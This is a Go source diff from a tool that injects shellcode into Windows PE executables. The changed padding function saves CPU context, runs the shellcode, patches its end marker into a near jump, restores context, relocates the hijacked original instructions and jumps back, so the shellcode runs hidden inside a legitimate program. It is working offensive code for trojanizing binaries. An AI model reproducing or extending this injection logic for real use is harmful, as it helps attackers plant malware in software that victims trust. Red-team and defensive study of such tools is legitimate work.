@@ -175,7 +175,7 @@ func (inj *Injector) Inject(image, shellcode []byte, opts *Options) ([]byte, err
 // InjectRaw is used to inject shellcode to a PE image without loader.
 // It is an advanced usage, ensure the shellcode not contains behavior
 // like read data from the shellcode tail.
-// Must use nop5 for set a flag that define the end of shellcode.
+// Must use "nop 5" for set a flag that define the end of shellcode.
 func (inj *Injector) InjectRaw(image []byte, shellcode []byte, opts *Options) ([]byte, error) {
 	if len(shellcode) == 0 {
 		return nil, errors.New("empty shellcode")
@@ -234,7 +234,8 @@ func (inj *Injector) inject(shellcode []byte) error {
 		return err
 	}
 	if inj.section != nil {
-		return inj.padding(targetRVA)
+		inj.padding(shellcode, targetRVA)
+		return nil
 	}
 	return inj.insert(targetRVA, first)
 }
@@ -553,9 +554,74 @@ func (inj *Injector) removeCodeCave(i int) {
 	inj.caves = append(inj.caves[:i], inj.caves[i+1:]...)
 }
 
-func (inj *Injector) padding(targetRVA uint32) error {
+func (inj *Injector) padding(shellcode []byte, targetRVA uint32) {
+	var (
+		saveContext    []byte
+		restoreContext []byte
+	)
+	if !inj.opts.NotSaveContext {
+		saveContext = mergeBytes(inj.saveContext())
+		restoreContext = mergeBytes(inj.restoreContext())
+	}
+	var oriInstOffset uint32
+	oriInstOffset += uint32(len(saveContext))
+	oriInstOffset += uint32(len(shellcode))
+	oriInstOffset += uint32(len(restoreContext))
+	// build final instructions
+	insts := bytes.NewBuffer(make([]byte, 0, len(shellcode)+64))
+	insts.Write(saveContext)
+	// replace the end of shellcode to jmp to restore context
+	var scLen uint32
+	for i := 0; i < len(inj.segment); i++ {
+		segment := inj.segment[i]
+		// check it is the end of the shellcode
+		if !bytes.Equal(segment, endOfShellcode) {
+			insts.Write(segment)
+			scLen += uint32(len(segment))
+			continue
+		}
+		offset := uint32(len(saveContext)+len(shellcode)) - scLen
+		rel := offset - nearJumpSize
+		jmp := make([]byte, nearJumpSize)
+		jmp[0] = 0xE9
+		binary.LittleEndian.PutUint32(jmp[1:], rel)
+		insts.Write(jmp)
+	}
+	insts.Write(restoreContext)
+	// write hooked original instruction
+	var (
+		offTarget uint32
+		offInst   uint32
+	)
+	for i := 0; i < len(inj.oriInst); i++ {
+		inst := inj.extendInstruction(nil, inj.oriInst[i])
+		// relocate instruction
+		current := int64(inj.section.VirtualAddress + oriInstOffset + offInst)
+		offset := current - int64(targetRVA+offTarget)
+		inst = inj.relocateInstruction(inst, offset)
+		insts.Write(inst)
+		offTarget += uint32(len(inj.oriInst[i]))
+		offInst += uint32(len(inst))
+	}
+	// write jmp to the next original instruction
+	offset := inj.section.VirtualAddress + oriInstOffset + offInst
+	rel := offset - targetRVA - nearJumpSize
+	jmp := make([]byte, nearJumpSize)
+	jmp[0] = 0xE9
+	binary.LittleEndian.PutUint32(jmp[1:], rel)
+	insts.Write(jmp)
+	// write random data for padding caves
+	inj.rand.Read(inj.dup[inj.section.Offset : inj.section.Offset+reservedLoaderSize])
+	// write shellcode loader
+	copy(inj.dup[inj.section.Offset:], insts.Bytes())
+}
 
-	return nil
+func mergeBytes(b [][]byte) []byte {
+	var o []byte
+	for i := 0; i < len(b); i++ {
+		o = append(o, b[i]...)
+	}
+	return o
 }
 
 func (inj *Injector) cleanup() {
